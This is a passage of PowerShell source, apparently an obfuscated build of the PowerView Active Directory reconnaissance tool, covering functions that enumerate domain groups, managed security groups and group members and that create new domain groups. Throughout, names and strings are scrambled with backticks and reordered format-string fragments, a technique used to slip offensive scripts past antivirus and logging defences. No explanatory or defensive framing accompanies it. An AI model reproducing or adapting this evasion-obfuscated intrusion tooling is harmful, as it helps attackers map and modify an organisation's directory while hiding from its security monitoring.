                    elseif (${ID`ENt`ItyINST`AncE}.("{2}{1}{0}" -f 'ns','ontai','C').Invoke('\')) {
                        ${CONvE`RtEDIDEn`T`itY`I`NstAN`CE} = ${i`de`NTITyIn`sT`ANCE}.("{0}{1}{2}"-f'R','eplac','e').Invoke('\28', '(').("{0}{1}"-f'Re','place').Invoke('\29', ')') | &("{1}{2}{3}{0}" -f 'ame','Con','ve','rt-ADN') -OutputType ("{0}{2}{1}" -f 'Ca','l','nonica')
                        if (${co`NVErteDiD`EntI`TyiNST`A`N`CE}) {
                            ${grou`p`dOMaIn} = ${cOn`VerT`ED`iDE`NtItYiNStAnce}.("{1}{2}{0}" -f'ring','Sub','St').Invoke(0, ${coNVE`RTEDI`de`N`T`ITYinSTance}.("{0}{1}"-f 'Ind','exOf').Invoke('/'))
                            ${gR`o`UPnAme} = ${IDEnti`T`yiNs`TAnCe}.("{1}{0}" -f 'lit','Sp').Invoke('\')[1]
                            ${i`dEnTI`Tyf`i`Lter} += "(samAccountName=$GroupName)"
                            ${sEA`RC`heRaRGUm`E`Nts}[("{1}{0}"-f 'omain','D')] = ${G`ROuPDO`M`AIN}
                            &("{2}{1}{3}{0}{4}"-f'er','e-','Writ','V','bose') ('['+'Get-'+'Doma'+'i'+'nGro'+'up] '+'Extra'+'ct'+'ed '+'dom'+'ain'+' '+"'$GroupDomain' "+'from'+' '+"'$IdentityInstance'")
                            ${GR`O`UpSE`A`RcheR} = &("{2}{3}{1}{0}{4}" -f'inSear','oma','G','et-D','cher') @SearcherArguments
                        }
                    }
                    else {
                        ${I`dentI`T`Yfi`lTer} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if (${ide`NtIt`YfIL`TER} -and (${IDEnTi`Tyfi`L`TeR}.("{0}{1}" -f'Tri','m').Invoke() -ne '') ) {
                    ${F`IlTEr} += "(|$IdentityFilter)"
                }

                if (${p`SBO`Un`D`pArAMe`Ters}[("{0}{2}{1}"-f 'A','Count','dmin')]) {
                    &("{1}{0}{2}{3}"-f'erb','Write-V','os','e') ("{3}{4}{5}{1}{2}{0}{6}{7}"-f'adminC','ch','ing for ','[Ge','t-DomainGroup','] Sear','o','unt=1')
                    ${FIL`T`ER} += ("{0}{3}{1}{2}" -f '(admi','unt=1',')','nco')
                }
                if (${pSB`OuN`D`paramEt`ERs}[("{1}{0}{2}"-f 'u','Gro','pScope')]) {
                    ${g`ROUPSCOP`EV`A`LUE} = ${p`s`B`ouNdPAr`AM`ETERs}[("{0}{2}{3}{1}"-f 'Gro','cope','u','pS')]
                    ${fiL`TeR} = Switch (${G`R`oupscoPEVaL`UE}) {
                        ("{3}{1}{0}{2}" -f 'ca','Lo','l','Domain')       { (("{5}{7}{2}{0}{4}{3}{6}{1}"-f'.2.840','4)',':1','13556','.1','(groupT','.1.4.803:=','ype')) }
                        ("{1}{0}{2}{3}" -f'c','NotDomainLo','a','l')    { ("{8}{9}{3}{4}{2}{5}{6}{7}{0}{1}{10}" -f '4.803:','=4','.840','p','e:1.2','.113','556.1','.','(!(groupT','y','))') }
                        ("{0}{1}" -f'G','lobal')            { ("{1}{6}{4}{7}{5}{3}{0}{2}"-f '03','(',':=2)','556.1.4.8','oupType','840.113','gr',':1.2.') }
                        ("{2}{0}{1}"-f 'loba','l','NotG')         { (("{5}{6}{2}{4}{3}{1}{7}{8}{0}" -f ')','.1','pTyp','40','e:1.2.8','(!(gr','ou','13556.1.','4.803:=2)')) }
                        ("{0}{1}{2}" -f'Univ','ersa','l')         { ("{0}{3}{2}{8}{1}{5}{7}{4}{6}"-f '(','113556.','oupType:1','gr','803','1.',':=8)','4.','.2.840.') }
                        ("{1}{2}{0}" -f 'al','NotUniv','ers')      { ((("{10}{8}{2}{5}{3}{11}{1}{9}{6}{0}{7}{4}" -f'6.1.4.803:=8','1','.2.','40',')','8','355',')',':1','1','(!(groupType','.'))) }
                    }
                    &("{2}{3}{0}{1}" -f'e','rbose','W','rite-V') ('[Get-DomainG'+'roup'+']'+' '+'Search'+'i'+'ng '+'f'+'or '+'g'+'roup'+' '+'sc'+'o'+'pe '+"'$GroupScopeValue'")
                }
                if (${PS`BOUnDpa`RA`metERs}[("{1}{3}{0}{2}" -f 't','GroupProp','y','er')]) {
                    ${GrO`Up`p`ROp`ErtY`VAluE} = ${psbOUNd`paR`AmE`T`e`Rs}[("{1}{0}{3}{2}"-f 'r','G','Property','oup')]
                    ${F`IL`TeR} = Switch (${GRo`UpP`RO`P`ERTYV`ALUe}) {
                        ("{0}{2}{1}"-f 'S','urity','ec')              { ("{5}{12}{1}{7}{13}{9}{8}{0}{10}{11}{2}{4}{3}{6}" -f '8','roup','1','8','.4.803:=214748364','(',')','Type:','2.','.','40.113556','.','g','1') }
                        ("{1}{2}{0}" -f'ibution','Dist','r')          { ((("{6}{5}{4}{7}{2}{0}{3}{8}{1}"-f'.1.','))','6','4.803:=214748','2',':1.','(!(groupType','.840.11355','3648'))) }
                        ("{2}{0}{1}" -f'ate','dBySystem','Cre')       { (("{4}{2}{7}{8}{6}{1}{0}{5}{3}" -f '13','.1','Ty','1.4.803:=1)','(group','556.','.840','pe',':1.2')) }
                        ("{4}{2}{3}{5}{0}{1}"-f 'yS','ystem','otCre','at','N','edB')    { ((("{5}{2}{9}{0}{6}{8}{7}{4}{3}{1}"-f'pT','=1))','!(g','3:','1.4.80','(','y','113556.','pe:1.2.840.','rou'))) }
                    }
                    &("{0}{2}{1}"-f 'Writ','erbose','e-V') ('[Get-DomainGrou'+'p'+']'+' '+'S'+'earchi'+'ng '+'for'+' '+'gro'+'up '+'p'+'ro'+'perty '+"'$GroupPropertyValue'")
                }
                if (${Ps`BOUNdp`ArA`ME`TeRs}[("{2}{0}{1}"-f 'e','r','LDAPFilt')]) {
                    &("{2}{3}{4}{0}{1}" -f '-V','erbose','Wri','t','e') ('[G'+'et-D'+'omainGro'+'up] '+'Using'+' '+'additi'+'ona'+'l '+'LDA'+'P '+'fil'+'ter:'+' '+"$LDAPFilter")
                    ${f`i`LtER} += "$LDAPFilter"
                }

                ${g`RO`UP`SeArCHer}."f`ILTeR" = "(&(objectCategory=group)$Filter)"
                &("{0}{2}{3}{1}"-f'Wri','ose','t','e-Verb') "[Get-DomainGroup] filter string: $($GroupSearcher.filter) "

                if (${p`sBo`UnD`pA`RamEt`Ers}[("{0}{1}{2}"-f 'FindO','n','e')]) { ${res`ULts} = ${GrOuP`seA`RCH`Er}.("{1}{0}{2}"-f 'n','FindO','e').Invoke() }
                else { ${rE`Su`LTs} = ${groUps`eArc`HEr}.("{0}{2}{1}" -f 'FindA','l','l').Invoke() }
                ${REs`U`ltS} | &("{0}{1}{2}{3}"-f'Whe','re-Obj','ec','t') {${_}} | &("{2}{1}{3}{0}"-f 't','E','For','ach-Objec') {
                    if (${psB`O`UnDP`A`RAMetERs}['Raw']) {
                        
                        ${Gr`o`UP} = ${_}
                    }
                    else {
                        ${gR`Oup} = &("{1}{5}{0}{2}{3}{4}" -f't-LDAPPro','Conve','p','e','rty','r') -Properties ${_}."pROpeRt`i`eS"
                    }
                    ${gro`UP}."P`S`oBjECt"."typEn`AMeS".("{1}{0}" -f 'sert','In').Invoke(0, ("{2}{3}{0}{1}" -f'u','p','PowerView.','Gro'))
                    ${G`RO`Up}
                }
                if (${reS`U`lTs}) {
                    try { ${REs`UlTs}.("{0}{1}{2}" -f'd','ispos','e').Invoke() }
                    catch {
                        &("{0}{2}{1}" -f'Wr','erbose','ite-V') ("{8}{4}{3}{5}{7}{0}{1}{6}{2}"-f'ispo','sing',' object','mainGroup] Erro','o','r',' of the Results',' d','[Get-D')
                    }
                }
                ${G`Ro`UPseaRc`heR}.("{1}{0}"-f 'e','dispos').Invoke()
            }
        }
    }
}


function ne`w-`doMAi`NGroUp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{10}{11}{8}{5}{3}{7}{9}{12}{1}{6}{4}{0}"-f 'unctions','an','PSU','ssF','F','e','ging','o','ouldProc','r','seS','h','StateCh'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}" -f'o','uldP','PSSh','rocess'}, '')]
    [OutputType({"{5}{8}{0}{4}{1}{6}{2}{7}{3}"-f'ctoryServic','ccountMan','ment.Gr','al','es.A','Di','age','oupPrincip','re'})]
    Param(
        [Parameter(ManDATORy = ${T`RUE})]
        [ValidateLength(0, 256)]
        [String]
        ${samaCC`O`UNt`NamE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${NA`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Di`splay`NAme},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DesCrip`T`I`ON},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`MA`in},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`DE`Nt`IaL} =   (  VAriabLe 21gV7E  -vA)::"EMP`TY"
    )

    ${coNTe`xtaRGUm`eN`Ts} = @{
        ("{0}{1}"-f'Identi','ty') = ${sA`MA`Ccou`NT`NamE}
    }
    if (${P`S`BoUndP`ARamEt`ers}[("{1}{0}"-f 'omain','D')]) { ${C`onTEXTaRG`UME`NtS}[("{0}{1}{2}"-f 'D','o','main')] = ${d`omAiN} }
    if (${PS`BOuN`dPara`M`eteRs}[("{0}{1}{2}"-f 'Creden','tia','l')]) { ${CoNTE`xT`ArG`UM`ents}[("{2}{1}{0}" -f 'ial','nt','Crede')] = ${C`R`ed`eNTiAl} }
    ${Co`NT`eXT} = &("{2}{0}{1}{3}{4}{5}" -f't','-','Ge','Principa','lContex','t') @ContextArguments

    if (${Con`T`Ext}) {
        ${G`R`oup} = &("{2}{0}{1}" -f 'Objec','t','New-') -TypeName ("{3}{4}{6}{12}{10}{1}{5}{7}{8}{9}{11}{2}{13}{0}"-f 'rincipal','ccou','Grou','System.Direct','or','nt','yService','Man','ageme','n','.A','t.','s','pP') -ArgumentList (${C`ONtE`xT}."c`ONTeXt")

        
        ${Gr`oup}."sAMA`CcOu`N`TNA`mE" = ${cO`N`TexT}."i`dEN`TiTY"

        if (${psBOUND`pa`RaMe`TE`RS}[("{1}{0}"-f 'ame','N')]) {
            ${g`ROUP}."na`ME" = ${n`AMe}
        }
        else {
            ${gro`Up}."N`AMe" = ${C`oNtext}."I`DenTIty"
        }
        if (${P`sBo`UndPAr`AM`EterS}[("{1}{2}{3}{0}"-f'ame','Displ','ay','N')]) {
            ${g`RO`UP}."D`isp`lAY`NamE" = ${d`i`sPla`YNamE}
        }
        else {
            ${G`RO`Up}."d`iSP`l`Ayname" = ${Con`T`EXT}."Id`enTity"
        }

        if (${psbOU`N`DParamEt`ers}[("{2}{1}{0}"-f'n','io','Descript')]) {
            ${gR`o`UP}."DeScrip`T`Ion" = ${dES`CRIpt`IOn}
        }

        &("{0}{3}{1}{2}" -f 'Writ','Verb','ose','e-') ('[New-Do'+'mainG'+'ro'+'up] '+'A'+'t'+'tempti'+'ng '+'to'+' '+'c'+'reate '+'g'+'roup'+' '+"'$SamAccountName'")
        try {
            ${nU`LL} = ${g`R`oup}.("{0}{1}" -f'Sa','ve').Invoke()
            &("{3}{1}{0}{2}" -f 's','o','e','Write-Verb') ('[New'+'-Do'+'mainGro'+'u'+'p] '+'Gro'+'up '+"'$SamAccountName' "+'s'+'uc'+'ces'+'sfully '+'crea'+'ted')
            ${GRO`Up}
        }
        catch {
            &("{2}{0}{3}{1}" -f 'r','rning','W','ite-Wa') ('[New'+'-Domai'+'n'+'G'+'ro'+'up] '+'Er'+'ror '+'creatin'+'g'+' '+'gro'+'up '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function g`Et-DomAinmA`N`AgEdsEcuRIT`Y`gR`oUP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{2}{4}"-f 'Sho','uldPr','o','PS','cess'}, '')]
    [OutputType({"{4}{1}{2}{8}{6}{7}{5}{0}{3}" -f'curityGro','ow','er','up','P','nagedSe','iew.','Ma','V'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItion = 0, vAluefrOmPIPelINe = ${t`Rue}, VAlUEfROmpIpeliNebYprOPeRTynAmE = ${TR`Ue})]
        [Alias({"{0}{1}" -f 'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DOMA`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'h','AD','SPat'})]
        [String]
        ${s`EaRCHb`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}{4}"-f'lle','Domain','Cont','ro','r'})]
        [String]
        ${sEr`V`er},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{2}{1}{0}"-f 'vel','eLe','On'}, {"{2}{1}{0}"-f'e','btre','Su'})]
        [String]
        ${SEAr`cHscO`pE} = ("{2}{1}{0}" -f 'ee','r','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RES`UltPAGES`i`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SErVE`RtimEl`I`mIt},

        [Switch]
        ${Tomb`S`ToNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`ED`EnTi`Al} =   (GEt-iTEM  vARIABLE:21Gv7E).vALUE::"eMP`TY"
    )

    BEGIN {
        ${Sea`R`C`HErarguMe`N`Ts} = @{
            ("{2}{1}{3}{0}" -f 'ter','A','LD','PFil') = (("{3}{8}{13}{1}{9}{0}{5}{7}{12}{2}{11}{10}{4}{6}" -f 'rou','gedBy=','135','(&','.4.','pT','803:=2147483648))','ype:1.2.8','(man','*)(g','1','56.','40.1','a'))
            ("{0}{2}{1}"-f'Proper','s','tie') = ("{4}{3}{13}{8}{10}{6}{11}{12}{2}{7}{1}{9}{0}{5}"-f 'accountnam','e','n','stinguishedNam','di','e',',s','ttyp','dB',',sam','y','amacc','ou','e,manage')
        }
        if (${pS`Boun`d`PArAmET`ERs}[("{1}{0}{2}"-f 'as','SearchB','e')]) { ${sE`ArchErAR`G`UM`eNTS}[("{1}{2}{0}" -f 'Base','Sear','ch')] = ${S`eARc`hBaSe} }
        if (${ps`Boun`dP`Ar`AmeTERS}[("{1}{2}{0}"-f'r','S','erve')]) { ${sEaRC`H`ERaRg`Ume`N`Ts}[("{0}{1}" -f 'Serve','r')] = ${se`R`VeR} }
        if (${Psboun`d`pAr`Ame`TErs}[("{1}{3}{2}{0}"-f'e','Se','op','archSc')]) { ${s`eA`RCh`Erargume`N`TS}[("{1}{3}{0}{2}"-f 'Scop','S','e','earch')] = ${SE`ARChSC`OpE} }
        if (${PS`BO`UN`d`PAraMet`erS}[("{2}{1}{0}{3}" -f'geSi','sultPa','Re','ze')]) { ${SEaRcheraR`g`UM`e`N`TS}[("{1}{2}{0}{3}"-f'ltPageSi','Res','u','ze')] = ${R`E`SulTp`AGeSiZE} }
        if (${Ps`B`OUn`DPaRa`Me`TERs}[("{0}{3}{1}{2}"-f 'Ser','i','t','verTimeLim')]) { ${Se`A`RC`hErARGum`ENTS}[("{0}{2}{1}{3}{4}" -f 'S','Ti','erver','meL','imit')] = ${s`E`RVeR`TIMelIM`It} }
        if (${psbo`U`NDPARAMeTe`Rs}[("{0}{1}{2}"-f 'Secu','r','ityMasks')]) { ${s`e`Ar`c`hER`ARGumeNtS}[("{2}{0}{3}{1}"-f'ecu','tyMasks','S','ri')] = ${sEC`Ur`itY`MaSkS} }
        if (${pSbouNDpAr`A`M`E`TeRs}[("{2}{1}{0}"-f 'ne','sto','Tomb')]) { ${sEAR`cHeRaRGU`meN`Ts}[("{0}{2}{1}{3}" -f 'Tom','st','b','one')] = ${ToMb`sTO`NE} }
        if (${p`s`BOU`NDpAra`mETe`Rs}[("{0}{2}{1}"-f'Credent','al','i')]) { ${s`ear`CH`eR`ARGume`NtS}[("{1}{0}{2}" -f 'dentia','Cre','l')] = ${CrED`ENtI`Al} }
    }

    PROCESS {
        if (${Ps`BOu`NdPAR`A`mETers}[("{0}{1}"-f'Domai','n')]) {
            ${sEaRC`heRaRG`UM`eN`TS}[("{0}{1}" -f'Do','main')] = ${DO`ma`iN}
            ${tA`RGeTD`oMA`in} = ${dOm`AIn}
        }
        else {
            ${TAr`GETdo`MAiN} = ${E`N`V:useRD`NSD`oMAin}
        }

        
        &("{0}{2}{1}"-f 'G','nGroup','et-Domai') @SearcherArguments | &("{3}{2}{0}{1}" -f'-Obje','ct','ch','ForEa') {
            ${s`EaRcherAr`GuMEn`Ts}[("{1}{2}{0}"-f'erties','Pr','op')] = ("{3}{6}{2}{12}{1}{7}{5}{9}{8}{0}{4}{13}{11}{10}" -f 'coun','ount','me,name,s','di','tnam','yp','stinguishedna','t',',samac','e','d','ctsi','amacc','e,obje')
            ${sEARChER`A`RgUm`enTs}[("{1}{0}"-f'ntity','Ide')] = ${_}."MaNA`Ged`BY"
            ${nu`Ll} = ${s`eA`RC`heraRgUMENtS}.("{1}{2}{0}"-f 'e','R','emov').Invoke(("{1}{2}{0}"-f'r','LDA','PFilte'))

            
            
            ${gRo`UPMA`NA`g`ER} = &("{1}{0}{2}{4}{3}"-f 'et-Do','G','m','ect','ainObj') @SearcherArguments
            
            ${m`A`NAgeDg`RoUP} = &("{2}{1}{0}" -f'ct','bje','New-O') ("{1}{0}" -f 'bject','PSO')
            ${M`AN`AGEDGRo`Up} | &("{2}{1}{0}"-f'mber','Me','Add-') ("{1}{0}{3}{2}" -f 'oteproper','N','y','t') ("{2}{1}{0}"-f'me','roupNa','G') ${_}."s`AMaccOuNt`Na`Me"
            ${mana`GE`Dg`Roup} | &("{1}{0}{2}" -f 'e','Add-Memb','r') ("{0}{3}{2}{1}" -f'N','ty','r','oteprope') ("{3}{4}{1}{0}{2}"-f'nguis','pDisti','hedName','Gr','ou') ${_}."D`isTingUIsH`ed`NaME"
            ${MAN`AG`eDgR`oUp} | &("{2}{1}{0}"-f'r','embe','Add-M') ("{3}{0}{2}{1}" -f'eprop','ty','er','Not') ("{0}{1}{2}"-f 'Ma','nagerNam','e') ${grO`UpMANAg`Er}."s`AMACCou`N`TNa`ME"
            ${MA`NageD`G`RouP} | &("{0}{1}{2}" -f 'Add-Memb','e','r') ("{1}{2}{0}"-f 'property','No','te') ("{3}{4}{2}{6}{5}{0}{1}" -f 'shed','Name','D','M','anager','ngui','isti') ${GroU`PMA`NAger}."DiS`TinGuI`ShEdn`Ame"

            
            if (${G`ROUPMAN`AGEr}."SAma`cC`OuntTyPe" -eq 0x10000000) {
                ${m`AnAGedg`R`oUp} | &("{1}{2}{0}"-f 'mber','Add','-Me') ("{0}{1}{2}{3}"-f'No','tepr','o','perty') ("{1}{0}{3}{2}"-f 'ana','M','pe','gerTy') ("{1}{0}" -f 'p','Grou')
            }
            elseif (${groU`p`MAnAgEr}."sAMacc`Ou`NT`TYPE" -eq 0x30000000) {
                ${mAnAG`e`d`grO`UP} | &("{0}{1}{2}{3}" -f'A','dd','-M','ember') ("{1}{2}{0}" -f 'y','No','tepropert') ("{2}{0}{1}"-f 'r','Type','Manage') ("{1}{0}" -f'r','Use')
            }

            ${aclA`RG`UMenTs} = @{
                ("{2}{0}{1}" -f'enti','ty','Id') = ${_}."DISTiN`GUI`ShEdna`mE"
                ("{1}{0}{2}" -f'ghtsFilt','Ri','er') = ("{3}{2}{1}{0}"-f's','teMember','ri','W')
            }
            if (${PSB`OuNDPaRAMe`T`e`RS}[("{1}{0}"-f 'r','Serve')]) { ${AclAr`GuM`EN`Ts}[("{0}{1}"-f 'Serve','r')] = ${S`eRVeR} }
            if (${pSbOUN`Dp`AR`A`mETeRs}[("{0}{1}{3}{2}"-f'Se','archSc','e','op')]) { ${Ac`LArGU`MENtS}[("{1}{3}{0}{2}" -f'hS','Sea','cope','rc')] = ${s`EARc`H`SCOPe} }
            if (${PSBOU`NDpA`RamETE`RS}[("{0}{3}{1}{2}"-f'Res','tPa','geSize','ul')]) { ${A`ClAr`gume`N`Ts}[("{1}{0}{2}" -f'e','R','sultPageSize')] = ${reSu`lTpAG`ES`IZE} }
            if (${psBO`UnDpAR`Am`ETe`Rs}[("{3}{2}{1}{0}"-f'meLimit','i','T','Server')]) { ${AcLa`RgUME`N`Ts}[("{2}{0}{4}{1}{3}" -f'erv','meLimi','S','t','erTi')] = ${S`eRVer`TIme`Li`miT} }
            if (${PSbOu`Nd`P`Aramete`RS}[("{1}{2}{3}{0}"-f 'one','To','m','bst')]) { ${AcL`ArGU`me`NTS}[("{0}{1}" -f'Tomb','stone')] = ${To`mBSt`OnE} }
            if (${PsBo`Un`DPAraMetE`Rs}[("{1}{0}{2}"-f'reden','C','tial')]) { ${ACLaR`GuM`ents}[("{1}{0}{2}"-f'reden','C','tial')] = ${CRedenT`i`AL} }

            
            
            
            
            
            
            
            
            
            
            

            ${ma`N`AgeD`gr`oup} | &("{2}{0}{3}{1}" -f'emb','r','Add-M','e') ("{1}{2}{0}"-f 'ty','Noteprope','r') ("{1}{2}{4}{0}{3}"-f 'rit','Mana','ger','e','CanW') ("{2}{0}{1}"-f 'NKNO','WN','U')

            ${m`AN`AgEdgrO`UP}."P`SoBJ`eCT"."tyP`enAm`es".("{0}{1}{2}" -f 'I','ns','ert').Invoke(0, ("{0}{2}{4}{5}{1}{3}{6}" -f'Po','edSecur','werVie','ityGr','w.','Manag','oup'))
            ${mANa`Ge`Dg`ROUP}
        }
    }
}


function GE`T-`D`om`AINGRO`Upm`emBeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{3}{0}"-f's','oc','PSShouldPr','es'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{0}{6}{2}{1}{3}{4}" -f 'S','s','seDeclaredVarsMoreThanA','si','gnments','P','U'}, '')]
    [OutputType({"{2}{0}{4}{1}{3}" -f 'owe','iew.GroupMe','P','mber','rV'})]
    [CmdletBinding(defAulTpArAMeTeRSetNAme = {"{0}{1}" -f 'No','ne'})]
    Param(
        [Parameter(PosItIOn = 0, MANdaTOrY = ${tR`Ue}, VAlUEfrompiPELiNe = ${T`Rue}, VALuEfROmPipeliNebYPROPERTyNAMe = ${TR`UE})]
        [Alias({"{2}{3}{0}{1}{5}{4}"-f 'dN','a','Di','stinguishe','e','m'}, {"{0}{3}{2}{1}"-f'S','untName','cco','amA'}, {"{0}{1}" -f 'Nam','e'}, {"{0}{1}{2}{4}{3}"-f'MemberDist','ingui','sh','e','edNam'}, {"{1}{2}{0}" -f'ame','Membe','rN'})]
        [String[]]
        ${I`DE`NtItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`Om`AIN},

        [Parameter(PaRAmetErseTname = "M`ANua`LReCurSe")]
        [Switch]
        ${reC`Ur`SE},

        [Parameter(PArAMeTerSETnamE = "Re`c`U`RseusI`NgM`Atchi`NGruLe")]
        [Switch]
        ${R`Ec`UrSe`USingmATchi`NG`RULe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Filte','r'})]
        [String]
        ${LDApFI`lt`er},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'ADSPat','h'})]
        [String]
        ${Searc`h`BasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{2}{1}{5}{3}{0}" -f'troller','C','ain','n','Dom','o'})]
        [String]
        ${SEr`Ver},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{0}{1}{2}"-f'OneLe','ve','l'}, {"{1}{2}{0}" -f 'ee','Sub','tr'})]
        [String]
        ${sE`A`RCHsC`Ope} = ("{1}{0}" -f'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REsUlTpa`G`ES`IzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SER`VERtimEli`m`iT},

        [ValidateSet({"{1}{0}" -f 'cl','Da'}, {"{0}{1}" -f'Grou','p'}, {"{1}{0}"-f 'one','N'}, {"{1}{0}"-f 'wner','O'}, {"{1}{0}"-f'l','Sac'})]
        [String]
        ${seCuritym`AS`Ks},

        [Switch]
        ${To`m`BSt`ONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`DeNt`iaL} =   (VArIable  21gv7E  ).VaLUe::"emP`Ty"
    )

    BEGIN {
        ${seaRChERA`R`g`U`menTS} = @{
            ("{0}{1}{2}" -f'Prope','r','ties') = ("{3}{6}{1}{0}{2}{4}{5}" -f'disti','accountname,','ng','member,s','uishedna','me','am')
        }
        if (${Psbo`UND`paRAM`eteRS}[("{0}{1}"-f'Do','main')]) { ${SeA`Rc`HER`ARG`UMENTS}[("{0}{1}"-f'D','omain')] = ${doM`Ain} }
        if (${PSB`oun`dpARAmetE`Rs}[("{1}{0}{2}" -f'lte','LDAPFi','r')]) { ${sEArCHerArg`U`m`ents}[("{1}{2}{0}" -f'er','L','DAPFilt')] = ${ldA`Pf`Ilter} }
        if (${PSbOu`NdP`ArAME`T`e`RS}[("{1}{0}{2}"-f 'chBas','Sear','e')]) { ${S`eA`R`ChEr`ArGUMEn`Ts}[("{0}{3}{2}{1}" -f'Se','hBase','c','ar')] = ${sea`RcHba`SE} }
        if (${P`S`BoundPARam`eT`eRS}[("{2}{0}{1}"-f 'erv','er','S')]) { ${SEARC`HE`R`ArGume`NtS}[("{0}{1}"-f'Ser','ver')] = ${se`R`Ver} }
        if (${PsBOUn`dpa`R`AmeTerS}[("{1}{0}{2}{3}" -f'chSc','Sear','o','pe')]) { ${seA`RCh`e`RaRg`UmEntS}[("{0}{3}{2}{1}" -f 'Sea','e','op','rchSc')] = ${S`EaRChSc`o`PE} }
        if (${p`sb`oUnDpArA`m`EterS}[("{2}{0}{3}{1}" -f 'ul','PageSize','Res','t')]) { ${seARC`hER`A`RguMEnTs}[("{2}{0}{4}{3}{1}" -f 'ageS','e','ResultP','z','i')] = ${rEsu`LTpagEsi`zE} }
        if (${PsbOun`dPaR`AME`TErs}[("{2}{0}{1}{3}{4}"-f'rv','erTimeL','Se','im','it')]) { ${S`earCheRA`RgUm`E`Nts}[("{0}{1}{3}{2}"-f 'Serv','er','Limit','Time')] = ${S`eRveRT`I`Meli`m`iT} }
        if (${pSB`o`UNdPar`A`m`ETERS}[("{0}{1}{2}"-f'To','mb','stone')]) { ${SeA`RCheRArGume`N`TS}[("{1}{0}{2}"-f'to','Tombs','ne')] = ${tOmBS`To`Ne} }
        if (${P`sBo`UNDpAr`AM`e`Ters}[("{0}{1}{2}"-f 'Cr','e','dential')]) { ${sea`R`c`hERargumEnts}[("{1}{0}{2}" -f'e','Cr','dential')] = ${c`REDen`TIaL} }

        ${A`DnA`m`eargum`enTS} = @{}
        if (${PS`B`O`UndParAMe`T`ErS}[("{1}{0}{2}" -f'mai','Do','n')]) { ${a`dn`AmeARGum`eN`Ts}[("{1}{0}"-f'ain','Dom')] = ${dO`M`AIn} }
        if (${PsBoU`ND`pAr`AMETE`RS}[("{1}{0}"-f 'er','Serv')]) { ${A`dNAMe`ARG`Um`En`TS}[("{0}{1}"-f'Serve','r')] = ${S`er`Ver} }
        if (${pSBOu`NdPaRa`me`T`Ers}[("{3}{1}{0}{2}"-f'a','i','l','Credent')]) { ${a`dNaM`eA`RgUME`NTS}[("{2}{0}{3}{1}"-f 'nti','l','Crede','a')] = ${cR`EDE`NtiaL} }
    }

    PROCESS {
        ${G`RoUpsE`A`Rch`eR} = &("{4}{1}{0}{2}{3}" -f 'DomainS','t-','earche','r','Ge') @SearcherArguments
        if (${gr`Ou`pSEarc`hER}) {
            if (${PSboUN`d`PaRa`MetE`Rs}[("{1}{2}{4}{6}{0}{3}{5}" -f'in','Rec','urseUsi','g','ngMat','Rule','ch')]) {
                ${sEAR`CHeRarg`UmE`N`Ts}[("{0}{1}{2}"-f'Id','enti','ty')] = ${I`De`NT`iTy}
                ${S`Ea`RCheR`ARg`U`mENTS}['Raw'] = ${TR`Ue}
                ${g`ROUp} = &("{1}{3}{0}{2}"-f 'D','Get','omainGroup','-') @SearcherArguments

                if (-not ${G`RO`UP}) {
                    &("{1}{2}{0}"-f 'ng','Write-Wa','rni') ('[Get-DomainGro'+'up'+'Me'+'mb'+'er] '+'Error'+' '+'se'+'arch'+'ing '+'for'+' '+'gr'+'oup '+'wit'+'h '+'id'+'entity:'+' '+"$Identity")
                }
                else {
                    ${grOuPf`O`Un`DnaMe} = ${g`Roup}."P`Rop`erTIEs".("{1}{0}"-f 'm','ite').Invoke(("{1}{0}{2}{3}"-f'co','samac','unt','name'))[0]
                    ${gRO`UPfouN`DDn} = ${gR`oUP}."prOp`ERT`Ies".("{1}{0}"-f 'em','it').Invoke(("{3}{0}{1}{4}{5}{2}" -f 'is','tin','e','d','guishedn','am'))[0]

                    if (${pSBO`U`NdpARameT`ErS}[("{0}{1}" -f'Doma','in')]) {
                        ${g`RoUPFoun`DD`Oma`iN} = ${DoMa`iN}
                    }
                    else {
                        
                        if (${gRoupFOu`ND`Dn}) {
                            ${G`Ro`Upfou`Ndd`oM`AIN} = ${GrO`Upf`ou`Nddn}.("{0}{1}{2}" -f'SubS','trin','g').Invoke(${G`R`OUpfOu`NDdn}.("{0}{1}"-f'In','dexOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    &("{1}{2}{0}{3}"-f'erbos','Wr','ite-V','e') ('[Get-Do'+'m'+'ain'+'G'+'roupMem'+'ber] '+'U'+'si'+'ng '+'L'+'DAP '+'ma'+'tchi'+'ng '+'rul'+'e '+'t'+'o '+'r'+'ecurse '+'on'+' '+"'$GroupFoundDN', "+'only'+' '+'u'+'ser '+'acc'+'ou'+'nts '+'wi'+'ll '+'be'+' '+'ret'+'urne'+'d.')
